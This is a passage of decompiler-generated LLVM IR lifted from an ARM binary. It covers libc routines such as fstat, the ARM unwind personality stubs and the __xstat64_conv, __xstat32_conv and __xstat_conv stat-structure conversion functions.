  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 26312) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_179f8 = load i32, i32* @r0, align 4
  ret i32 %v1_179f8
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_179fc = load i32, i32* @r0, align 4
  ret i32 %v1_179fc
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_17a00 = load i32, i32* @r0, align 4
  ret i32 %v1_17a00
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_17a0c = load i32, i32* @r1, align 4
  store i32 %v0_17a0c, i32* @r3, align 4
  %v0_17a1c = load i32, i32* @r0, align 4
  store i32 %v0_17a1c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17a1c, -4095
  br i1 %tmp, label %dec_label_pc_17a3c, label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %entry
  %v0_17a28 = call i32 @__GI___errno_location()
  %v0_17a2c = load i32, i32* %r7.global-to-local, align 4
  %v1_17a2c = sub i32 0, %v0_17a2c
  store i32 %v1_17a2c, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17a34 = inttoptr i32 %v0_17a28 to i32*
  store i32 %v1_17a2c, i32* %v2_17a34, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a3c:                               ; preds = %entry
  %v2_17a3c = icmp eq i32 %v0_17a1c, 0
  br i1 %v2_17a3c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17a3c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17a3c, %bb
  call void @__pseudo_cond_branch(i1 %v2_17a3c, i32 ptrtoint (i32* @global_var_17bd4.626 to i32))
  br label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %dec_label_pc_17a28, %.thread
  %v0_17a4c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_17a4c

; uselistorder directives
  uselistorder i32 %v0_17a1c, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_17a4c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_17a5c = load i32, i32* @r4, align 4
  store i32 %v3_17a5c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_17a74 = inttoptr i32 %arg2 to i8*
  %v3_17a74 = call i32 @__GI_memset(i8* %v2_17a74, i32 0)
  %v2_17a78 = load i32, i32* %arg1, align 4
  store i32 %v2_17a78, i32* %r3.global-to-local, align 4
  %v3_17a78 = add i32 %tmp, 4
  %v4_17a78 = inttoptr i32 %v3_17a78 to i32*
  %v5_17a78 = load i32, i32* %v4_17a78, align 4
  store i32 %v5_17a78, i32* %r4.global-to-local, align 4
  %v0_17a7c = load i32, i32* %r5.global-to-local, align 4
  %v1_17a7c = inttoptr i32 %v0_17a7c to i32*
  store i32 %v2_17a78, i32* %v1_17a7c, align 4
  %v3_17a7c = add i32 %v0_17a7c, 4
  %v4_17a7c = inttoptr i32 %v3_17a7c to i32*
  %v5_17a7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17a7c, i32* %v4_17a7c, align 4
  %v0_17a80 = load i32, i32* %r6.global-to-local, align 4
  %v1_17a80 = add i32 %v0_17a80, 12
  %v2_17a80 = inttoptr i32 %v1_17a80 to i32*
  %v3_17a80 = load i32, i32* %v2_17a80, align 4
  %v1_17a84 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a84 = add i32 %v1_17a84, 12
  %v3_17a84 = inttoptr i32 %v2_17a84 to i32*
  store i32 %v3_17a80, i32* %v3_17a84, align 4
  %v0_17a88 = load i32, i32* %r6.global-to-local, align 4
  %v1_17a88 = add i32 %v0_17a88, 96
  store i32 %v1_17a88, i32* %r3.global-to-local, align 4
  %v1_17a8c = inttoptr i32 %v1_17a88 to i32*
  %v2_17a8c = load i32, i32* %v1_17a8c, align 4
  store i32 %v2_17a8c, i32* %r3.global-to-local, align 4
  %v3_17a8c = add i32 %v0_17a88, 100
  %v4_17a8c = inttoptr i32 %v3_17a8c to i32*
  %v5_17a8c = load i32, i32* %v4_17a8c, align 4
  store i32 %v5_17a8c, i32* %r4.global-to-local, align 4
  %v1_17a90 = add i32 %v0_17a88, 56
  %v2_17a90 = inttoptr i32 %v1_17a90 to i32*
  %v3_17a90 = load i32, i32* %v2_17a90, align 4
  store i32 %v3_17a90, i32* %r2.global-to-local, align 4
  %v1_17a94 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a94 = add i32 %v1_17a94, 96
  %v3_17a94 = inttoptr i32 %v2_17a94 to i32*
  store i32 %v2_17a8c, i32* %v3_17a94, align 4
  %v0_17a98 = load i32, i32* %r4.global-to-local, align 4
  %v1_17a98 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a98 = add i32 %v1_17a98, 100
  %v3_17a98 = inttoptr i32 %v2_17a98 to i32*
  store i32 %v0_17a98, i32* %v3_17a98, align 4
  %v0_17a9c = load i32, i32* %r6.global-to-local, align 4
  %v1_17a9c = add i32 %v0_17a9c, 24
  store i32 %v1_17a9c, i32* %ip.global-to-local, align 4
  %v1_17aa0 = inttoptr i32 %v1_17a9c to i32*
  %v2_17aa0 = load i32, i32* %v1_17aa0, align 4
  store i32 %v2_17aa0, i32* %ip.global-to-local, align 4
  %v3_17aa0 = add i32 %v0_17a9c, 28
  %v4_17aa0 = inttoptr i32 %v3_17aa0 to i32*
  %v5_17aa0 = load i32, i32* %v4_17aa0, align 4
  store i32 %v5_17aa0, i32* %lr.global-to-local, align 4
  %v0_17aa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17aa4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17aa4 = add i32 %v1_17aa4, 56
  %v3_17aa4 = inttoptr i32 %v2_17aa4 to i32*
  store i32 %v0_17aa4, i32* %v3_17aa4, align 4
  %v0_17aa8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17aa8 = add i32 %v0_17aa8, 72
  store i32 %v1_17aa8, i32* %r3.global-to-local, align 4
  %v1_17aac = add i32 %v0_17aa8, 32
  store i32 %v1_17aac, i32* %r7.global-to-local, align 4
  %v1_17ab0 = inttoptr i32 %v1_17aac to i32*
  %v2_17ab0 = load i32, i32* %v1_17ab0, align 4
  store i32 %v2_17ab0, i32* %r7.global-to-local, align 4
  %v3_17ab0 = add i32 %v0_17aa8, 36
  %v4_17ab0 = inttoptr i32 %v3_17ab0 to i32*
  %v5_17ab0 = load i32, i32* %v4_17ab0, align 4
  store i32 %v5_17ab0, i32* %r8.global-to-local, align 4
  %v1_17ab4 = inttoptr i32 %v1_17aa8 to i32*
  %v2_17ab4 = load i32, i32* %v1_17ab4, align 4
  %v3_17ab4 = add i32 %v0_17aa8, 76
  %v4_17ab4 = inttoptr i32 %v3_17ab4 to i32*
  %v5_17ab4 = load i32, i32* %v4_17ab4, align 4
  store i32 %v5_17ab4, i32* %r1.global-to-local, align 4
  %v0_17ab8 = load i32, i32* %r5.global-to-local, align 4
  %v1_17ab8 = add i32 %v0_17ab8, 72
  %v1_17abc = inttoptr i32 %v1_17ab8 to i32*
  store i32 %v2_17ab4, i32* %v1_17abc, align 4
  %v3_17abc = add i32 %v0_17ab8, 76
  %v4_17abc = inttoptr i32 %v3_17abc to i32*
  %v5_17abc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17abc, i32* %v4_17abc, align 4
  %v0_17ac0 = load i32, i32* %r7.global-to-local, align 4
  %v1_17ac0 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ac0 = add i32 %v1_17ac0, 32
  %v3_17ac0 = inttoptr i32 %v2_17ac0 to i32*
  store i32 %v0_17ac0, i32* %v3_17ac0, align 4
  %v0_17ac4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17ac4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ac4 = add i32 %v1_17ac4, 36
  %v3_17ac4 = inttoptr i32 %v2_17ac4 to i32*
  store i32 %v0_17ac4, i32* %v3_17ac4, align 4
  %v0_17ac8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17ac8 = add i32 %v0_17ac8, 80
  store i32 %v1_17ac8, i32* %r3.global-to-local, align 4
  %v1_17acc = add i32 %v0_17ac8, 48
  store i32 %v1_17acc, i32* %r7.global-to-local, align 4
  %v1_17ad0 = inttoptr i32 %v1_17acc to i32*
  %v2_17ad0 = load i32, i32* %v1_17ad0, align 4
  store i32 %v2_17ad0, i32* %r7.global-to-local, align 4
  %v3_17ad0 = add i32 %v0_17ac8, 52
  %v4_17ad0 = inttoptr i32 %v3_17ad0 to i32*
  %v5_17ad0 = load i32, i32* %v4_17ad0, align 4
  store i32 %v5_17ad0, i32* %r8.global-to-local, align 4
  %v1_17ad4 = inttoptr i32 %v1_17ac8 to i32*
  %v2_17ad4 = load i32, i32* %v1_17ad4, align 4
  %v3_17ad4 = add i32 %v0_17ac8, 84
  %v4_17ad4 = inttoptr i32 %v3_17ad4 to i32*
  %v5_17ad4 = load i32, i32* %v4_17ad4, align 4
  store i32 %v5_17ad4, i32* %r1.global-to-local, align 4
  %v1_17ad8 = add i32 %v0_17ac8, 16
  %v2_17ad8 = inttoptr i32 %v1_17ad8 to i32*
  %v3_17ad8 = load i32, i32* %v2_17ad8, align 4
  store i32 %v3_17ad8, i32* %r2.global-to-local, align 4
  %v0_17adc = load i32, i32* %r5.global-to-local, align 4
  %v1_17adc = add i32 %v0_17adc, 80
  %v1_17ae0 = inttoptr i32 %v1_17adc to i32*
  store i32 %v2_17ad4, i32* %v1_17ae0, align 4
  %v3_17ae0 = add i32 %v0_17adc, 84
  %v4_17ae0 = inttoptr i32 %v3_17ae0 to i32*
  %v5_17ae0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17ae0, i32* %v4_17ae0, align 4
  %v0_17ae4 = load i32, i32* %r7.global-to-local, align 4
  %v1_17ae4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ae4 = add i32 %v1_17ae4, 48
  %v3_17ae4 = inttoptr i32 %v2_17ae4 to i32*
  store i32 %v0_17ae4, i32* %v3_17ae4, align 4
  %v0_17ae8 = load i32, i32* %r8.global-to-local, align 4
  %v1_17ae8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ae8 = add i32 %v1_17ae8, 52
  %v3_17ae8 = inttoptr i32 %v2_17ae8 to i32*
  store i32 %v0_17ae8, i32* %v3_17ae8, align 4
  %v0_17aec = load i32, i32* %r2.global-to-local, align 4
  %v1_17aec = load i32, i32* %r5.global-to-local, align 4
  %v2_17aec = add i32 %v1_17aec, 16
  %v3_17aec = inttoptr i32 %v2_17aec to i32*
  store i32 %v0_17aec, i32* %v3_17aec, align 4
  %v0_17af0 = load i32, i32* %r6.global-to-local, align 4
  %v1_17af0 = add i32 %v0_17af0, 88
  store i32 %v1_17af0, i32* %r3.global-to-local, align 4
  %v1_17af4 = add i32 %v0_17af0, 20
  %v2_17af4 = inttoptr i32 %v1_17af4 to i32*
  %v3_17af4 = load i32, i32* %v2_17af4, align 4
  store i32 %v3_17af4, i32* %r2.global-to-local, align 4
  %v1_17af8 = inttoptr i32 %v1_17af0 to i32*
  %v2_17af8 = load i32, i32* %v1_17af8, align 4
  %v3_17af8 = add i32 %v0_17af0, 92
  %v4_17af8 = inttoptr i32 %v3_17af8 to i32*
  %v5_17af8 = load i32, i32* %v4_17af8, align 4
  store i32 %v5_17af8, i32* %r1.global-to-local, align 4
  %v1_17afc = add i32 %v0_17af0, 64
  store i32 %v1_17afc, i32* %r6.global-to-local, align 4
  %v1_17b00 = inttoptr i32 %v1_17afc to i32*
  %v2_17b00 = load i32, i32* %v1_17b00, align 4
  store i32 %v2_17b00, i32* %r6.global-to-local, align 4
  %v3_17b00 = add i32 %v0_17af0, 68
  %v4_17b00 = inttoptr i32 %v3_17b00 to i32*
  %v5_17b00 = load i32, i32* %v4_17b00, align 4
  store i32 %v5_17b00, i32* %r7.global-to-local, align 4
  %v0_17b04 = load i32, i32* %r5.global-to-local, align 4
  %v1_17b04 = add i32 %v0_17b04, 88
  store i32 %v1_17b04, i32* %r3.global-to-local, align 4
  %v2_17b08 = add i32 %v0_17b04, 20
  %v3_17b08 = inttoptr i32 %v2_17b08 to i32*
  store i32 %v3_17af4, i32* %v3_17b08, align 4
  %v0_17b0c = load i32, i32* %ip.global-to-local, align 4
  %v1_17b0c = load i32, i32* %r5.global-to-local, align 4
  %v2_17b0c = add i32 %v1_17b0c, 24
  %v3_17b0c = inttoptr i32 %v2_17b0c to i32*
  store i32 %v0_17b0c, i32* %v3_17b0c, align 4
  %v0_17b10 = load i32, i32* %lr.global-to-local, align 4
  %v1_17b10 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b10 = add i32 %v1_17b10, 28
  %v3_17b10 = inttoptr i32 %v2_17b10 to i32*
  store i32 %v0_17b10, i32* %v3_17b10, align 4
  %v0_17b14 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b14 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b14 = add i32 %v1_17b14, 64
  %v3_17b14 = inttoptr i32 %v2_17b14 to i32*
  store i32 %v0_17b14, i32* %v3_17b14, align 4
  %v0_17b18 = load i32, i32* %r7.global-to-local, align 4
  %v1_17b18 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b18 = add i32 %v1_17b18, 68
  %v3_17b18 = inttoptr i32 %v2_17b18 to i32*
  store i32 %v0_17b18, i32* %v3_17b18, align 4
  %v0_17b1c = load i32, i32* %r3.global-to-local, align 4
  %v1_17b1c = inttoptr i32 %v0_17b1c to i32*
  store i32 %v2_17af8, i32* %v1_17b1c, align 4
  %v3_17b1c = add i32 %v0_17b1c, 4
  %v4_17b1c = inttoptr i32 %v3_17b1c to i32*
  %v5_17b1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17b1c, i32* %v4_17b1c, align 4
  %v2_17b20 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17b20, i32* %r4.global-to-local, align 4
  ret i32 %v2_17af8

; uselistorder directives
  uselistorder i32 %v0_17af0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17ac8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 104, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_17b28 = load i32, i32* @r4, align 4
  store i32 %v3_17b28, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_17b40 = inttoptr i32 %arg2 to i8*
  %v3_17b40 = call i32 @__GI_memset(i8* %v2_17b40, i32 0)
  %v2_17b44 = load i32, i32* %arg1, align 4
  %v3_17b44 = add i32 %tmp, 4
  %v4_17b44 = inttoptr i32 %v3_17b44 to i32*
  %v5_17b44 = load i32, i32* %v4_17b44, align 4
  store i32 %v5_17b44, i32* %r4.global-to-local, align 4
  %v0_17b48 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b48 = inttoptr i32 %v0_17b48 to i32*
  store i32 %v2_17b44, i32* %v1_17b48, align 4
  %v3_17b48 = add i32 %v0_17b48, 4
  %v4_17b48 = inttoptr i32 %v3_17b48 to i32*
  %v5_17b48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17b48, i32* %v4_17b48, align 4
  %v0_17b4c = load i32, i32* %r5.global-to-local, align 4
  %v1_17b4c = add i32 %v0_17b4c, 32
  %v1_17b50 = inttoptr i32 %v1_17b4c to i32*
  %v2_17b50 = load i32, i32* %v1_17b50, align 4
  %v3_17b50 = add i32 %v0_17b4c, 36
  %v4_17b50 = inttoptr i32 %v3_17b50 to i32*
  %v5_17b50 = load i32, i32* %v4_17b50, align 4
  store i32 %v5_17b50, i32* %r4.global-to-local, align 4
  %v1_17b54 = add i32 %v0_17b4c, 96
  %v2_17b54 = inttoptr i32 %v1_17b54 to i32*
  %v3_17b54 = load i32, i32* %v2_17b54, align 4
  store i32 %v3_17b54, i32* %r2.global-to-local, align 4
  %v1_17b58 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b58 = add i32 %v1_17b58, 32
  %v3_17b58 = inttoptr i32 %v2_17b58 to i32*
  store i32 %v2_17b50, i32* %v3_17b58, align 4
  %v0_17b5c = load i32, i32* %r4.global-to-local, align 4
  %v1_17b5c = load i32, i32* %r6.global-to-local, align 4
  %v2_17b5c = add i32 %v1_17b5c, 36
  %v3_17b5c = inttoptr i32 %v2_17b5c to i32*
  store i32 %v0_17b5c, i32* %v3_17b5c, align 4
  %v0_17b60 = load i32, i32* %r2.global-to-local, align 4
  %v1_17b60 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b60 = add i32 %v1_17b60, 12
  %v3_17b60 = inttoptr i32 %v2_17b60 to i32*
  store i32 %v0_17b60, i32* %v3_17b60, align 4
  %v0_17b64 = load i32, i32* %r5.global-to-local, align 4
  %v1_17b64 = add i32 %v0_17b64, 48
  %v2_17b64 = inttoptr i32 %v1_17b64 to i32*
  %v3_17b64 = load i32, i32* %v2_17b64, align 4
  %v1_17b68 = add i32 %v0_17b64, 24
  store i32 %v1_17b68, i32* %ip.global-to-local, align 4
  %v1_17b6c = inttoptr i32 %v1_17b68 to i32*
  %v2_17b6c = load i32, i32* %v1_17b6c, align 4
  store i32 %v2_17b6c, i32* %ip.global-to-local, align 4
  %v3_17b6c = add i32 %v0_17b64, 28
  %v4_17b6c = inttoptr i32 %v3_17b6c to i32*
  %v5_17b6c = load i32, i32* %v4_17b6c, align 4
  store i32 %v5_17b6c, i32* %lr.global-to-local, align 4
  %v1_17b70 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b70 = add i32 %v1_17b70, 44
  %v3_17b70 = inttoptr i32 %v2_17b70 to i32*
  store i32 %v3_17b64, i32* %v3_17b70, align 4
  %v0_17b74 = load i32, i32* %r5.global-to-local, align 4
  %v1_17b74 = add i32 %v0_17b74, 64
  %v2_17b74 = inttoptr i32 %v1_17b74 to i32*
  %v3_17b74 = load i32, i32* %v2_17b74, align 4
  %v1_17b78 = add i32 %v0_17b74, 56
  %v2_17b78 = inttoptr i32 %v1_17b78 to i32*
  %v3_17b78 = load i32, i32* %v2_17b78, align 4
  store i32 %v3_17b78, i32* %r2.global-to-local, align 4
  %v1_17b7c = load i32, i32* %r6.global-to-local, align 4
  %v2_17b7c = add i32 %v1_17b7c, 52
  %v3_17b7c = inttoptr i32 %v2_17b7c to i32*
  store i32 %v3_17b74, i32* %v3_17b7c, align 4
  %v0_17b80 = load i32, i32* %r2.global-to-local, align 4
  %v1_17b80 = load i32, i32* %r6.global-to-local, align 4
  %v2_17b80 = add i32 %v1_17b80, 48
  %v3_17b80 = inttoptr i32 %v2_17b80 to i32*
  store i32 %v0_17b80, i32* %v3_17b80, align 4
  %v0_17b84 = load i32, i32* %r5.global-to-local, align 4
  %v1_17b84 = add i32 %v0_17b84, 72
  %v1_17b88 = inttoptr i32 %v1_17b84 to i32*
  %v2_17b88 = load i32, i32* %v1_17b88, align 4
  %v3_17b88 = add i32 %v0_17b84, 76
  %v4_17b88 = inttoptr i32 %v3_17b88 to i32*
  %v5_17b88 = load i32, i32* %v4_17b88, align 4
  store i32 %v5_17b88, i32* %r1.global-to-local, align 4
  %v0_17b8c = load i32, i32* %r6.global-to-local, align 4
  %v1_17b8c = add i32 %v0_17b8c, 56
  %v1_17b90 = inttoptr i32 %v1_17b8c to i32*
  store i32 %v2_17b88, i32* %v1_17b90, align 4
  %v3_17b90 = add i32 %v0_17b8c, 60
  %v4_17b90 = inttoptr i32 %v3_17b90 to i32*
  %v5_17b90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17b90, i32* %v4_17b90, align 4
  %v0_17b94 = load i32, i32* %r5.global-to-local, align 4
  %v1_17b94 = add i32 %v0_17b94, 80
  %v1_17b98 = inttoptr i32 %v1_17b94 to i32*
  %v2_17b98 = load i32, i32* %v1_17b98, align 4
  %v3_17b98 = add i32 %v0_17b94, 84
  %v4_17b98 = inttoptr i32 %v3_17b98 to i32*
  %v5_17b98 = load i32, i32* %v4_17b98, align 4
  store i32 %v5_17b98, i32* %r1.global-to-local, align 4
  %v0_17b9c = load i32, i32* %r6.global-to-local, align 4
  %v1_17b9c = add i32 %v0_17b9c, 64
  %v1_17ba0 = inttoptr i32 %v1_17b9c to i32*
  store i32 %v2_17b98, i32* %v1_17ba0, align 4
  %v3_17ba0 = add i32 %v0_17b9c, 68
  %v4_17ba0 = inttoptr i32 %v3_17ba0 to i32*
  %v5_17ba0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17ba0, i32* %v4_17ba0, align 4
  %v0_17ba4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17ba4 = add i32 %v0_17ba4, 16
  %v2_17ba4 = inttoptr i32 %v1_17ba4 to i32*
  %v3_17ba4 = load i32, i32* %v2_17ba4, align 4
  %v1_17ba8 = load i32, i32* %r6.global-to-local, align 4
  %v2_17ba8 = add i32 %v1_17ba8, 16
  %v3_17ba8 = inttoptr i32 %v2_17ba8 to i32*
  store i32 %v3_17ba4, i32* %v3_17ba8, align 4
  %v0_17bac = load i32, i32* %r5.global-to-local, align 4
  %v1_17bac = add i32 %v0_17bac, 88
  %v1_17bb0 = add i32 %v0_17bac, 20
  %v2_17bb0 = inttoptr i32 %v1_17bb0 to i32*
  %v3_17bb0 = load i32, i32* %v2_17bb0, align 4
  store i32 %v3_17bb0, i32* %r2.global-to-local, align 4
  %v1_17bb4 = inttoptr i32 %v1_17bac to i32*
  %v2_17bb4 = load i32, i32* %v1_17bb4, align 4
  %v3_17bb4 = add i32 %v0_17bac, 92
  %v4_17bb4 = inttoptr i32 %v3_17bb4 to i32*
  %v5_17bb4 = load i32, i32* %v4_17bb4, align 4
  store i32 %v5_17bb4, i32* %r1.global-to-local, align 4
  %v0_17bb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17bb8 = add i32 %v0_17bb8, 72
  %v1_17bbc = inttoptr i32 %v1_17bb8 to i32*
  store i32 %v2_17bb4, i32* %v1_17bbc, align 4
  %v3_17bbc = add i32 %v0_17bb8, 76
  %v4_17bbc = inttoptr i32 %v3_17bbc to i32*
  %v5_17bbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17bbc, i32* %v4_17bbc, align 4
  %v0_17bc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17bc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_17bc0 = add i32 %v1_17bc0, 20
  %v3_17bc0 = inttoptr i32 %v2_17bc0 to i32*
  store i32 %v0_17bc0, i32* %v3_17bc0, align 4
  %v0_17bc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_17bc4 = load i32, i32* %r6.global-to-local, align 4
  %v2_17bc4 = add i32 %v1_17bc4, 24
  %v3_17bc4 = inttoptr i32 %v2_17bc4 to i32*
  store i32 %v0_17bc4, i32* %v3_17bc4, align 4
  %v0_17bc8 = load i32, i32* %lr.global-to-local, align 4
  %v1_17bc8 = load i32, i32* %r6.global-to-local, align 4
  %v2_17bc8 = add i32 %v1_17bc8, 28
  %v3_17bc8 = inttoptr i32 %v2_17bc8 to i32*
  store i32 %v0_17bc8, i32* %v3_17bc8, align 4
  %v2_17bcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17bcc, i32* %r4.global-to-local, align 4
  ret i32 %v2_17bb4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 96, { 4, 5, 6, 7, 8, 1, 2, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_17bf0 = inttoptr i32 %arg2 to i8*
  %v3_17bf0 = call i32 @__GI_memset(i8* %v2_17bf0, i32 0)
  %v1_17bf4 = add i32 %tmp, 4
  %v2_17bf4 = inttoptr i32 %v1_17bf4 to i32*
  %v3_17bf4 = load i32, i32* %v2_17bf4, align 4
  %v2_17bf8 = load i32, i32* %arg1, align 4
  store i32 %v2_17bf8, i32* %r8.global-to-local, align 4
  %v1_17bfc = load i32, i32* %r5.global-to-local, align 4
  %v2_17bfc = add i32 %v1_17bfc, 12
  %v3_17bfc = inttoptr i32 %v2_17bfc to i32*
  store i32 %v3_17bf4, i32* %v3_17bfc, align 4
  %v0_17c00 = load i32, i32* %r4.global-to-local, align 4
  %v1_17c00 = add i32 %v0_17c00, 20
  %v2_17c00 = inttoptr i32 %v1_17c00 to i32*
  %v3_17c00 = load i32, i32* %v2_17c00, align 4
  %v1_17c04 = add i32 %v0_17c00, 16
  %v2_17c04 = inttoptr i32 %v1_17c04 to i32*
  %v3_17c04 = load i32, i32* %v2_17c04, align 4
  store i32 %v3_17c04, i32* %r6.global-to-local, align 4
  %v1_17c08 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c08 = add i32 %v1_17c08, 44
  %v3_17c08 = inttoptr i32 %v2_17c08 to i32*
  store i32 %v3_17c00, i32* %v3_17c08, align 4
  %v0_17c0c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c0c = add i32 %v0_17c0c, 24
  %v2_17c0c = inttoptr i32 %v1_17c0c to i32*
  %v3_17c0c = load i32, i32* %v2_17c0c, align 4
  %v1_17c10 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c10 = add i32 %v1_17c10, 48
  %v3_17c10 = inttoptr i32 %v2_17c10 to i32*
  store i32 %v3_17c0c, i32* %v3_17c10, align 4
  %v0_17c14 = load i32, i32* %r4.global-to-local, align 4
  %v1_17c14 = add i32 %v0_17c14, 28
  %v2_17c14 = inttoptr i32 %v1_17c14 to i32*
  %v3_17c14 = load i32, i32* %v2_17c14, align 4
  %v1_17c18 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c18 = add i32 %v1_17c18, 52
  %v3_17c18 = inttoptr i32 %v2_17c18 to i32*
  store i32 %v3_17c14, i32* %v3_17c18, align 4
  %v0_17c1c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c1c = add i32 %v0_17c1c, 32
  %v1_17c20 = inttoptr i32 %v1_17c1c to i32*
  %v2_17c20 = load i32, i32* %v1_17c20, align 4
  %v3_17c20 = add i32 %v0_17c1c, 36
  %v4_17c20 = inttoptr i32 %v3_17c20 to i32*
  %v5_17c20 = load i32, i32* %v4_17c20, align 4
  store i32 %v5_17c20, i32* %r1.global-to-local, align 4
  %v0_17c24 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c24 = add i32 %v0_17c24, 56
  %v1_17c28 = inttoptr i32 %v1_17c24 to i32*
  store i32 %v2_17c20, i32* %v1_17c28, align 4
  %v3_17c28 = add i32 %v0_17c24, 60
  %v4_17c28 = inttoptr i32 %v3_17c28 to i32*
